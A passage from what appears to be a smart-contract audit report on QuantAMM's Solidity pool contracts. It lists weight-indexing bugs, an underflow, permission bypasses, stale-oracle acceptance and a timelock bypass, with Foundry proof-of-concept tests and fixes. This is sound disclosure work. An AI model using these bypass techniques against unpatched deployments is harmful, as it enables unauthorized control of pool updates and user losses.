- In [`QuantAMMWeightedPool::_getNormalisedWeightPair`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L320):
  ```solidity
  if (tokenIndexTwo > 4) { // @audit should be >=
  ```

**Impact:**
1. Swaps where `indexIn > 4` and `indexOut < 4` are impossible.
2. Swaps involving token index 4 cannot be performed.
3. If swaps with `indexIn > 4` and `indexOut < 4` would be possible, the swap amounts would be calculated incorrectly.

**Proof of Concept:** Add the following tests to `pkg/pool-quantamm/test/foundry/QuantAMMWeightedPool8Token.t.sol` to demonstrate the issues:
```solidity
// cross swap not working correctly
function testGetNormalizedWeightOnSwapOutGivenInNBlocksAfterToken7Token3() public {
    testParam memory firstWeight = testParam(7, 0.1e18, 0.001e18); // indexIn > 4
    testParam memory secondWeight = testParam(3, 0.15e18, 0.001e18); // indexOut < 4
    // will revert on underflow
    _onSwapOutGivenInInternal(firstWeight, secondWeight, 2, 1.006410772600252500e18);
}
// index >= 4 not working correctly
function testGetNormalizedWeightOnSwapOutGivenInInitialToken0Token4() public {
    testParam memory firstWeight = testParam(0, 0.1e18, 0.001e18);
    testParam memory secondWeight = testParam(4, 0.15e18, 0.001e18);
    // fails with `panic: array out-of-bounds access`
    _onSwapOutGivenInInternal(firstWeight, secondWeight, 0, 0.499583703357018000e18);
}
// index >= 4 not working correctly
function testGetNormalizedWeightOnSwapOutGivenInInitialToken4Token0() public {
    testParam memory firstWeight = testParam(4, 0.1e18, 0.001e18);
    testParam memory secondWeight = testParam(0, 0.15e18, 0.001e18);
    // fails with `panic: array out-of-bounds access`
    _onSwapOutGivenInInternal(firstWeight, secondWeight, 0, 0.887902403682279000e18);
}
```

**Recommended Mitigation:**
1. **Refactor the `if` block** in `QuantAMMWeightedPool::onSwap` as follows:

   ```solidity
   if (request.indexIn < 4 && request.indexOut < 4 || request.indexIn >= 4 && request.indexOut >= 4) {
       // Same slot; _getNormalisedWeightPair handles the correct logic
       tokenWeights = _getNormalisedWeightPair(...);
   } else {
       // Cross-slot handling
       tokenWeights = _getNormalizedWeight(...);
   }
   ```

2. **Update** conditions `> 4` to `>= 4` at the following lines:

   - [Line 320](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L320)
   - [Line 383](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L383)

**QuantAmm:**
Fixed in [`414d4bc`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/414d4bc3d8699f1e4620f0060226b4e23ff3b010)

**Cyfrin:** Verfied.


### Token Index error in `getNormalizedWeights` calculates incorrect weight leading to incorrect pool asset allocation

**Description:** The `_getNormalizedWeights()` function in `QuantAMMWeightedPool.sol` contains a critical indexing error when handling multipliers for pools with more than 4 tokens. The error causes incorrect multiplier values to be used when calculating interpolated weights for tokens 4-7, potentially leading to severe asset allocation errors.

The issue occurs in the _getNormalizedWeights() function when handling the second storage slot for pools with more than 4 tokens:

```solidity
function _getNormalizedWeights() internal view virtual returns (uint256[] memory) {
    // ...
    uint256 tokenIndex = totalTokens;
    if (totalTokens > 4) {
        tokenIndex = 4;  // @audit Sets to 4 for first slot multipliers
    }

    // First slot handles correctly
    normalizedWeights[0] = calculateBlockNormalisedWeight(
        firstFourWeights[0],
        firstFourWeights[tokenIndex],  // Uses indices 4-7 for multipliers
        timeSinceLastUpdate
    );
    // ...

    // Second slot has indexing error
    if (totalTokens > 4) {
        tokenIndex -= 4;  // @audit Resets to 0, breaking multiplier indices
        int256[] memory secondFourWeights = quantAMMUnpack32(_normalizedSecondFourWeights);
        normalizedWeights[4] = calculateBlockNormalisedWeight(
            secondFourWeights[0],
            secondFourWeights[tokenIndex],  // @audit Uses wrong indices 0-3 for multipliers -> essentially weight and multiplier are same
            timeSinceLastUpdate
        );
        // ...
    }
}
```
When processing the second slot of tokens (indices 4-7):
- First tokenIndex is set to 4 if total tokens > 4
- tokenIndex is decremented by 4, resetting to 0
- For all subsequent weight calculations, the weight & multiplier are effectively the same

**Impact:**
- Incorrect weight calculations for tokens 4-7 in pools with more than 4 tokens
- Significant deviation from intended pool asset allocation ratios


**Recommended Mitigation:** When there are more than 4 tokens in the pool, do not decrement the tokenIndex by 4.

**QuantAMM:** Fixed in [`60815f2`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/60815f262748579cba99bafb640e7931d6f13c47)

**Cyfrin:** Verified


### Incorrect handling of negative multipliers in `QuantAMMWeightedPool` leads to underflow in weight calculation

**Description:** In [`QuantAMMWeightedPool::calculateBlockNormalisedWeight`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L505-L521):
```solidity
if (multiplier > 0) {
    return uint256(weight) + FixedPoint.mulDown(uint256(multiplierScaled18), timeSinceLastUpdate);
} else {
    // @audit silent overflow, uint256(multiplierScaled18) of a negative value will result in a very large value
    return uint256(weight) - FixedPoint.mulUp(uint256(multiplierScaled18), timeSinceLastUpdate);
}
```

**Impact:** All swaps with negative multiplier which aren't on the same block that the update happened (`timeSinceLastUpdate != 0`) will fail due to underflow.

**Proof of Concept:** Add the following test to `pkg/pool-quantamm/test/foundry/QuantAMMWeightedPool8Token.t.sol`:
```solidity
function testGetNormalizeNegativeMultiplierOnSwapOutGivenInInitialToken0Token1() public {
    testParam memory firstWeight = testParam(0, 0.1e18, 0.001e18);
    testParam memory secondWeight = testParam(1, 0.15e18, -0.001e18);
    _onSwapOutGivenInInternal(firstWeight, secondWeight, 2, 1.332223208952048000e18);
}
```

**Recommended Mitigation:** Consider multiplying by `-1` first:
```diff
- return uint256(weight) - FixedPoint.mulUp(uint256(multiplierScaled18), timeSinceLastUpdate);
+ return uint256(weight) - FixedPoint.mulUp(uint256(-multiplierScaled18), timeSinceLastUpdate);
```

**QuantAMM:** Fixed in commit [`31636cf`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/31636cf736e9f6eda09f569bceb4e8d9bd3137bb)

**Cyfrin:** Verified.


### Mismatch in multiplier position causes incorrect weight calculations in `QuantAMMWeightedPool`

**Description:** The primary feature of QuantAMM weighted pools is to periodically update weights based on various trading rules set during pool creation. These weights are updated by a singleton contract, `UpdateWeightRunner`, which provides new weights and multipliers. The multipliers help to adjust the weights between blocks until the next update.

To optimize gas usage compared to Balancer weighted pools, QuantAMM packs weights and multipliers into just two storage slots.

When an update occurs, `UpdateWeightRunner` sends the new weights to [`QuantAMMWeightedPool::setWeights`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L588-L615). The weights and multipliers are sent in a different format than the pool expects though, as described in the [NatSpec comment](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L696) for `QuantAMMWeightedPool::_splitWeightAndMultipliers`:

```solidity
/// @dev Update weight runner gives all weights in a single array shaped like [w1,w2,w3,w4,w5,w6,w7,w8,m1,m2,m3,m4,m5,m6,m7,m8], we need it to be [w1,w2,w3,w4,m1,m2,m3,m4,w5,w6,w7,w8,m5,m6,m7,m8]
```

The data is then split into two storage slots as follows:
- **First slot:** `[w1, w2, w3, w4, m1, m2, m3, m4]`
- **Second slot:** `[w5, w6, w7, w8, m5, m6, m7, m8]`

For a pool with just two tokens, `UpdateWeightRunner` sends the weights and multipliers as `[w1, w2, m1, m2]`, which are stored in this same order (with zeros padded at the end). However, for a pool with more tokens (e.g., 6 tokens), more complex logic is required to split the data into two slots. This is handled by [`QuantAMMWeightedPool::_splitWeightAndMultipliers`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L694-L722).

When `UpdateWeightRunner` sends the weights and multipliers for 6 tokens as `[w1, w2, w3, w4, w5, w6, m1, m2, m3, m4, m5, m6]`, the [first slot](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L700-L710) is populated like this:

```solidity
uint256 tokenLength = weights.length / 2;
splitWeights = new int256[][](2);
splitWeights[0] = new int256[](8);
for (uint i; i < 4; ) {
    splitWeights[0][i] = weights[i];
    splitWeights[0][i + 4] = weights[i + tokenLength];


    unchecked {
        i++;
    }
}
```

This results in the first slot being `[w1, w2, w3, w4, m1, m2, m3, m4]`.

The [second slot](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L711-L721) is handled with the following logic:

```solidity
splitWeights[1] = new int256[](8);
uint256 moreThan4Tokens = tokenLength - 4;
for (uint i = 0; i < moreThan4Tokens; ) {
    uint256 i4 = i + 4;
    splitWeights[1][i] = weights[i4];
    splitWeights[1][i4] = weights[i4 + tokenLength];

    unchecked {
        i++;
    }
}
```

For 6 tokens, this results in the second slot being `[w5, w6, 0, 0, m5, m6, 0, 0]`.

The issue arises when these values are read in [`QuantAMMWeightedPool::_getNormalizedWeight`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L381-L388):

```solidity
uint256 tokenIndexInPacked = totalTokens;

if (tokenIndex > 4) {
    //get the index in the second storage int
    index = tokenIndex - 4;
    targetWrappedToken = _normalizedSecondFourWeights;
    tokenIndexInPacked -= 4;
} else {
```

Here, `tokenIndexInPacked` becomes `6 - 4 = 2`, which is then used in [`QuantAMMWeightedPool::_calculateCurrentBlockWeight`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMWeightedPool.sol#L364):

```solidity
int256 blockMultiplier = tokenWeights[tokenIndex + (tokensInTokenWeights)];
```
For token index 5, or index 1 in second slot, this attempts to access the multiplier at position `1 + 2 = 3`, whereas the multiplier is actually in the fifth position. This mismatch causes incorrect multipliers or no multipliers to be used.

**Impact:** The incorrect reading of multipliers causes the wrong weight to be applied during token swaps. As a result, swap amounts may be incorrect, leading to unintended and potentially harmful outcomes for users.

**Proof of Concept:** Add this test to `pkg/pool-quantamm/test/foundry/QuantAMMWeightedPool8Token.t.sol`:
```solidity
function testGetNormalizedWeightsInitial6Tokens() public {
    int256 weight = int256(1e18) / 6 + 1;
    PoolRoleAccounts memory roleAccounts;
    IERC20[] memory tokens = [
        address(dai),
        address(usdc),
        address(weth),
        address(wsteth),
        address(veBAL),
        address(waDAI)
    ].toMemoryArray().asIERC20();
    MockMomentumRule momentumRule = new MockMomentumRule(owner);

    int256[] memory initialWeights = new int256[](6);
    initialWeights[0] = weight;
    initialWeights[1] = weight;
    initialWeights[2] = weight - 1;
    initialWeights[3] = weight - 1;
    initialWeights[4] = weight;
    initialWeights[5] = weight;

    uint256[] memory initialWeightsUint = new uint256[](6);
    initialWeightsUint[0] = uint256(weight);
    initialWeightsUint[1] = uint256(weight);
    initialWeightsUint[2] = uint256(weight - 1);
    initialWeightsUint[3] = uint256(weight - 1);
    initialWeightsUint[4] = uint256(weight);
    initialWeightsUint[5] = uint256(weight);

    uint64[] memory lambdas = new uint64[](1);
    lambdas[0] = 0.2e18;

    int256[][] memory parameters = new int256[][](1);
    parameters[0] = new int256[](1);
    parameters[0][0] = 0.2e18;

    address[][] memory oracles = new address[][](1);
    oracles[0] = new address[](1);
    oracles[0][0] = address(chainlinkOracle);

    QuantAMMWeightedPoolFactory.NewPoolParams memory params = QuantAMMWeightedPoolFactory.NewPoolParams(
        "Pool With Donation",
        "PwD",
        vault.buildTokenConfig(tokens),
        initialWeightsUint,
        roleAccounts,
        MAX_SWAP_FEE_PERCENTAGE,
        address(0),
        true,
        false, // Do not disable unbalanced add/remove liquidity
        ZERO_BYTES32,
        initialWeights,
        IQuantAMMWeightedPool.PoolSettings(
            new IERC20[](6),
            IUpdateRule(momentumRule),
            oracles,
            60,
            lambdas,
            0.01e18,
            0.01e18,
            0.01e18,
            parameters,
            address(0)
        ),
        initialWeights,
        initialWeights,
        3600,
        0,
        new string[][](0)
    );

    address quantAMMWeightedPool = quantAMMWeightedPoolFactory.create(params);

    uint256[] memory weights = QuantAMMWeightedPool(quantAMMWeightedPool).getNormalizedWeights();

    int256[] memory newWeights = new int256[](12);
    newWeights[0] = weight;
    newWeights[1] = weight;
    newWeights[2] = weight - 1;
    newWeights[3] = weight - 1;
    newWeights[4] = weight;
    newWeights[5] = weight;
    newWeights[6] = 0.001e18;
    newWeights[7] = 0.001e18;
    newWeights[8] = 0.001e18;
    newWeights[9] = 0.001e18;
    newWeights[10] = 0.001e18;
    newWeights[11] = 0.001e18;

    vm.prank(address(updateWeightRunner));
    QuantAMMWeightedPool(quantAMMWeightedPool).setWeights(
        newWeights,
        quantAMMWeightedPool,
        uint40(block.timestamp + 5)
    );

    uint256[] memory balances = new uint256[](6);
    balances[0] = 1000e18;
    balances[1] = 1000e18;
    balances[2] = 1000e18;
    balances[3] = 1000e18;
    balances[4] = 1000e18;
    balances[5] = 1000e18;

    PoolSwapParams memory swapParams = PoolSwapParams({
        kind: SwapKind.EXACT_IN,
        amountGivenScaled18: 1e18,
        balancesScaled18: balances,
        indexIn: 0,
        indexOut: 1,
        router: address(router),
        userData: abi.encode(0)
    });

    vm.warp(block.timestamp + 5);

    vm.prank(address(vault));
    uint256 swap1Balance = QuantAMMWeightedPool(quantAMMWeightedPool).onSwap(swapParams);

    swapParams.indexOut = 5;

    vm.prank(address(vault));
    uint256 swap5Balance = QuantAMMWeightedPool(quantAMMWeightedPool).onSwap(swapParams);

    assertEq(swap1Balance, swap5Balance);
}
```

**Recommended Mitigation:** Consider storing the second slot the same way as the first one:
```diff
- splitWeights[1][i4] = weights[i4 + tokenLength];
+ splitWeights[1][i + moreThan4Tokens] = weights[i4 + tokenLength];
```
This will also require changes to `getNormalizedWeights` as it assumes a distance of 4 in the second weight slot.


**[Project]:**
Fixed in commit [`31636cf`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/31636cf736e9f6eda09f569bceb4e8d9bd3137bb) and [`8a6b3b2`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/8a6b3b2d8ecd8cb52ecd652a0c3e02ab4964e8df)

**Cyfrin:** Verified.

\clearpage
## Medium Risk


### Incorrect range validation in `quantAMMPackEight32` allows invalid values to be packed

**Description:** The `ScalarQuantAMMBaseStorage::quantAMMPackEight32` function contains incorrect validation logic that fails to properly check minimum bounds for six out of eight input parameters. The require statement incorrectly reuses `_firstInt` for minimum bound checks instead of checking each respective input parameter.

```solidity
require(
    _firstInt <= MAX32 &&
        _firstInt >= MIN32 &&
        _secondInt <= MAX32 &&
        _secondInt >= MIN32 &&
        _thirdInt <= MAX32 &&
        _firstInt >= MIN32 &&  // @audit should be _thirdInt
        _fourthInt <= MAX32 &&
        _firstInt >= MIN32 &&  // @audit should be _fourthInt
        _fifthInt <= MAX32 &&
        _firstInt >= MIN32 &&  // @audit should be _fifthInt
        _sixthInt <= MAX32 &&
        _firstInt >= MIN32 &&  // @audit should be _sixthInt
        _seventhInt <= MAX32 &&
        _firstInt >= MIN32 &&  // @audit should be _seventhInt
        _eighthInt <= MAX32 &&
        _firstInt >= MIN32,    // @audit should be _eighthInt
    "Overflow"
);
```
This function is called by `quantAMMPack32Array` which inturn is used in the `QuantAMMWeightedPool::setWeights` function to pack weight values.

**Impact:** While the `setWeights` function is protected by access controls (only callable by `updateWeightRunner`), allowing invalid values to be packed could lead to unexpected behavior in weight calculations.

**Proof of Concept:** TBD

**Recommended Mitigation:** Consider updating the require statement to properly validate minimum bounds for all input parameters:

**QuantAmm:**
We use the pack in setInitialWeights which is used in the initialise function. Given the absolute guard rail logic etc I do not think it is mathematically possible for this to be triggered during running of the pool I think they may only fail the deployment of the pool if a pool is initialised with bad weights. Fixed in commit [`408ba20`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/408ba203c1b6c4abfd3474e4baa448af3752ea6e).

**Cyfrin:** Verified.


### Lack of permission check allows unauthorized updates to `lastPoolUpdateRun`

**Description:** To apply the weight changes calculated by the rules, any user can call [`UpdateWeightRunner::performUpdate`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/UpdateWeightRunner.sol#L256-L279).

Each pool has a set of permissions, configured during deployment in `QuantAMMWeightedPool.poolRegistry`. Each bit in this registry represents a specific permission. To execute `performUpdate`, the `MASK_POOL_PERFORM_UPDATE` bit must be set.

To prevent `performUpdate` from being called too frequently, which could impact the smoothing of the algorithms used, each pool has a configured `updateInterval` that dictates the minimum time between updates.

An admin can override this restriction by calling [`UpdateWeightRunner::InitialisePoolLastRunTime`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/UpdateWeightRunner.sol#L289-L304).

The ability to call `InitialisePoolLastRunTime` is restricted based on permissions. The pool [requires](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/UpdateWeightRunner.sol#L295-L302) either the `MASK_POOL_DAO_WEIGHT_UPDATES` or the `MASK_POOL_OWNER_UPDATES` bit to be set, and it verifies the identity of the caller accordingly:

```solidity
// Current breakglass settings allow DAO or pool creator to trigger updates. This is subject to review.
if (poolRegistryEntry & MASK_POOL_DAO_WEIGHT_UPDATES > 0) {
    address daoRunner = QuantAMMBaseAdministration(quantammAdmin).daoRunner();
    require(msg.sender == daoRunner, "ONLYDAO");
} else if (poolRegistryEntry & MASK_POOL_OWNER_UPDATES > 0) {
    require(msg.sender == poolRuleSettings[_poolAddress].poolManager, "ONLYMANAGER");
}
poolRuleSettings[_poolAddress].timingSettings.lastPoolUpdateRun = _time;
```

If none of these permissions are set, anyone can call `InitialisePoolLastRunTime`.

**Impact:** A malicious user can:

1. **Prevent legitimate updates** by modifying `lastPoolUpdateRun` to an inappropriate time.
2. **Bypass `updateInterval` restrictions** by setting `lastPoolUpdateRun` to a time far in the past, allowing updates to be performed sooner than intended.


**Proof of Concept:** Add the following test to `pkg/pool-quantamm/test/foundry/UpdateWeightRunner.t.sol`:
```solidity
function testAnyoneCanUpdatePoolLastRunTime() public {
    // pool lacks MASK_POOL_DAO_WEIGHT_UPDATES and MASK_POOL_OWNER_UPDATES but has MASK_POOL_PERFORM_UPDATE
    mockPool.setPoolRegistry(1);

    vm.startPrank(owner);
    // Deploy oracles with fixed values and delay
    chainlinkOracle1 = deployOracle(1001, 0);
    chainlinkOracle2 = deployOracle(1002, 0);

    updateWeightRunner.addOracle(chainlinkOracle1);
    updateWeightRunner.addOracle(chainlinkOracle2);
    vm.stopPrank();

    address[][] memory oracles = new address[][](2);
    oracles[0] = new address[](1);
    oracles[0][0] = address(chainlinkOracle1);
    oracles[1] = new address[](1);
    oracles[1][0] = address(chainlinkOracle2);

    uint64[] memory lambda = new uint64[](1);
    lambda[0] = 0.0000000005e18;
    vm.prank(address(mockPool));
    updateWeightRunner.setRuleForPool(
        IQuantAMMWeightedPool.PoolSettings({
            assets: new IERC20[](0),
            rule: IUpdateRule(mockRule),
            oracles: oracles,
            updateInterval: 10,
            lambda: lambda,
            epsilonMax: 0.2e18,
            absoluteWeightGuardRail: 0.2e18,
            maxTradeSizeRatio: 0.2e18,
            ruleParameters: new int256[][](0),
            poolManager: addr2
        })
    );

    address anyone = makeAddr("anyone");

    vm.prank(anyone);
    updateWeightRunner.InitialisePoolLastRunTime(address(mockPool), uint40(block.timestamp));

    vm.expectRevert("Update not allowed");
    updateWeightRunner.performUpdate(address(mockPool));
}
```

**Recommended Mitigation:** Add an `else` clause to revert when no appropriate permissions are set. This ensures only authorized users can modify `lastPoolUpdateRun`:

```diff
}
+ else {
+     revert("No permission to set lastPoolUpdateRun");
+ }
poolRuleSettings[_poolAddress].timingSettings.lastPoolUpdateRun = _time;
```

**QuantAMM:** Fixed in [`a69c06f`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/a69c06f27ce52a2a7c42bfad23b0de9da7d766e9) and [`84f506f`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/84f506f7e61e07c36d354f428b0e0f7d226de0d9)

**Cyfrin:** Verified. Calls to `InitialisePoolLastRunTime` now revert for an unauthorized user.


### Faulty permission check in `UpdateWeightRunner::getData` allows unauthorized access

**Description:** Certain actions on a pool are protected by permissions. One such permission is `POOL_GET_DATA`, which governs access to the [`UpdateWeightRunner::getData`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/UpdateWeightRunner.sol#L315-L366) function:

```solidity
bool internalCall = msg.sender != address(this);
require(internalCall || approvedPoolActions[_pool] & MASK_POOL_GET_DATA > 0, "Not allowed to get data");
```

The issue lies in how the `internalCall` condition is enforced. The variable `internalCall` is intended to check if the call is made internally by the contract. However, this logic behaves incorrectly:

- `internalCall` will always be `true` because `UpdateWeightRunner` does not call `getData` in a way that changes the call context (i.e., `address(this).getData()`). As a result, `msg.sender` is never equal to `address(this)`.
- Consequently, the statement `msg.sender != address(this)` will always evaluate to `true`, allowing the `require` condition to pass regardless of the pool's permissions.

As a result, the `POOL_GET_DATA` permission is effectively bypassed.

**Impact:** The `UpdateWeightRunner::getData` function can be called on pools that lack the `POOL_GET_DATA` permission.

**Proof of Concept:** Add the following test to `pkg/pool-quantamm/test/foundry/UpdateWeightRunner.t.sol`:
```solidity
function testUpdateWeightRunnerGetDataPermissionCanByBypassed() public {
    vm.prank(owner);
    updateWeightRunner.setApprovedActionsForPool(address(mockPool), 1);

    assertEq(updateWeightRunner.getPoolApprovedActions(address(mockPool)) & 2 /* MASK_POOL_GET_DATA */, 0);

    // this should revert as the pool is not allowed to get data
    updateWeightRunner.getData(address(mockPool));
}
```

**Recommended Mitigation:** Consider removing the `internalCall` boolean entirely. This change will ensure that only calls with the correct `POOL_GET_DATA` permission are allowed. Additionally, this modification allows `getData` to be a `view` function, as the [event emission](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/UpdateWeightRunner.sol#L363-L365) at the end becomes unnecessary.

Here is the recommended code change:
```diff
- function getData(address _pool) public returns (int256[] memory outputData) {
+ function getData(address _pool) public view returns (int256[] memory outputData) {
-     bool internalCall = msg.sender != address(this);
-     require(internalCall || approvedPoolActions[_pool] & MASK_POOL_GET_DATA > 0, "Not allowed to get data");
+     require(approvedPoolActions[_pool] & MASK_POOL_GET_DATA > 0, "Not allowed to get data");
// ...
-     if(!internalCall){
-         emit GetData(msg.sender, _pool);
-     }
```

**QuantAMM:** Fixed in [`a1a333d`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/a1a333d28b0aae82338f4ba440af1a473ef1eda6)

**Cyfrin:** Verified. Code refactored, `internalCall` now passed as a parameter to a new `UpdateWeightRunner::_getData`. The original `UpdateWeightRunner::getData` requires permission but the internal call during update does not.


### Stale Oracle prices accepted when no backup oracles available

**Description:** The `UpdateWeightRunner::getData` function performs staleness checks on oracle prices to ensure price data is fresh. However, when the optimized (primary) oracle returns stale data and there are no backup oracles configured, the function silently accepts and returns the stale price data instead of reverting.

This occurs because the logic checks for staleness on the primary oracle, but if stale, it moves to a backup oracle check section.
When no backup oracles exist, this section is skipped due to array length checks, and the function proceeds to use the stale data from the primary oracle.

```solidity
// getData function
function getData(address _pool) public returns (int256[] memory outputData) {
         // .... code
        outputData = new int256[](oracleLength);
        uint oracleStalenessThreshold = IQuantAMMWeightedPool(_pool).getOracleStalenessThreshold();

        for (uint i; i < oracleLength; ) {
            // Asset is base asset
            OracleData memory oracleResult;
            oracleResult = _getOracleData(OracleWrapper(optimisedOracles[i]));
            if (oracleResult.timestamp > block.timestamp - oracleStalenessThreshold) {
                outputData[i] = oracleResult.data; //@audit skips this correctly when data is stale
            } else {
                unchecked {
                    numAssetOracles = poolBackupOracles[_pool][i].length;
                }

                for (uint j = 1 /*0 already done via optimised poolOracles*/; j < numAssetOracles; ) { //@audit for loop is skipped when no backup oracle
                    oracleResult = _getOracleData(
                        // poolBackupOracles[_pool][asset][oracle]
                        OracleWrapper(poolBackupOracles[_pool][i][j])
                    );
                    if (oracleResult.timestamp > block.timestamp - oracleStalenessThreshold) {
                        // Oracle has fresh values
                        break;
                    } else if (j == numAssetOracles - 1) {
                        // All oracle results for this data point are stale. Should rarely happen in practice with proper backup oracles.

                        revert("No fresh oracle values available");
                    }
                    unchecked {
                        ++j;
                    }
                }
                outputData[i] = oracleResult.data; //@audit BUG - here it accepts the same stale data that was rejected before
            }

            unchecked {
                ++i;
            }
        }

        if(!internalCall){
            emit GetData(msg.sender, _pool);
        }
    }

```

**Impact:** Stale oracle prices could be used to calculate pool weight updates, leading to incorrect weight adjustments based on outdated market information.

**Recommended Mitigation:** Consider reverting in the `else` block when `numAssetOracles == 1`

```solidity
 else {
    unchecked {
        numAssetOracles = poolBackupOracles[_pool][i].length;
    }

    if (numAssetOracles == 1) {  // @audit revert when No backups available (1 accounts for primary oracle)
        revert("No fresh oracle values available");
    }

    for (uint j = 1; j < numAssetOracles; ) {
        // ... rest of the code
    }
}
```

**QuantAMM:** A stale update is better than none because of the way the estimators encapsulate a weighted price and a certain level of smoothing. The longer away a price is, the less important. So triggering an update may mean its with a current stale price however it keeps all the historical prices baked into the exponential smoothing on track in terms of their importance.

**Cyfrin:** Acknowledged.


### Missing admin functions prevent execution of key `UpdateWeightRunner` actions

**Description:** Several functions in `UpdateWeightRunner` require the `quantammAdmin` role, but these functions are missing from `QuantAMMBaseAdministration`. The affected functions are:

* [`UpdateWeightRunner::addOracle`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/UpdateWeightRunner.sol#L182-L195)
* [`UpdateWeightRunner::removeOracle`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/UpdateWeightRunner.sol#L197-L203)
* [`UpdateWeightRunner::setApprovedActionsForPool`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/UpdateWeightRunner.sol#L205-L209)
* [`UpdateWeightRunner::setETHUSDOracle`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/UpdateWeightRunner.sol#L281-L287)

Since these functions rely on `quantammAdmin`, they cannot be executed unless the corresponding calls are included in `QuantAMMBaseAdministration`.

**Impact:** The `QuantAMMBaseAdministration` contract cannot execute the above functions. As a result, administrative actions such as adding or removing oracles, setting approved actions for pools, and updating the ETH/USD oracle cannot be performed, limiting the functionality and flexibility of the system.

**Recommended Mitigation:** Consider one of the following approaches:

1. Add the Missing Functions to `QuantAMMBaseAdministration`
2. Use OpenZeppelins `TimeLock` Contract Directly:
   If `QuantAMMBaseAdministration` is redundant, replace it with OpenZeppelin's `TimeLock` contract to manage administrative functions securely and effectively.

**QuantAMM:** Fixed in [`a299ce7`](https://github.com/QuantAMMProtocol/QuantAMM-V1/commit/a299ce72076b58503386bc146b81014560536d9e)

**Cyfrin:** Verified. `QuantAMMBaseAdministration` is removed.


### `QuantAMMBaseAdministration::onlyExecutor` modifier does not enforce a time lock on actions

**Description:** In `QuantAMMBaseAdministration`, certain functions are restricted using the [`onlyExecutor`](https://github.com/QuantAMMProtocol/QuantAMM-V1/blob/7213401491f6a8fd1fcc1cf4763b15b5da355f1c/pkg/pool-quantamm/contracts/QuantAMMBaseAdministration.sol#L77-L81) modifier:
```solidity
// Modifier to check for EXECUTOR_ROLE using `timelock`
modifier onlyExecutor() {
    require(timelock.hasRole(timelock.EXECUTOR_ROLE(), msg.sender), "Not an executor");
    _;
}
```
The issue with this modifier is that it does not enforce a timelock on the actions. Instead, it only verifies that the caller has the `EXECUTOR_ROLE` on the timelock contract. As seen in the OpenZeppelin [`TimelockController` code](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v5.0/contracts/governance/TimelockController.sol#L351-L371), this check allows anyone with the `EXECUTOR_ROLE` to bypass the timelock and execute commands directly on `QuantAMMBaseAdministration`.

**Impact:** Anyone with permission to execute actions on the timelock contract can bypass the timelock and execute the same commands directly on the `QuantAMMBaseAdministration` contract. This undermines the purpose of the timelock, which is to provide a delay for critical actions.

**Recommended Mitigation:**
1. **Modify the `onlyExecutor` Modifier to Enforce Timelock:**
   Change the `onlyExecutor` modifier to require that the caller is the timelock contract itself:

   ```solidity
   modifier onlyTimelock() {
       require(address(timelock) == msg.sender, "Only timelock");
       _;
   }
   ```

2. **Make `timelock` Public:**
   To allow querying the timelock's address for proposing actions, make the `timelock` variable `public`:

   ```diff
   - TimelockController private timelock;
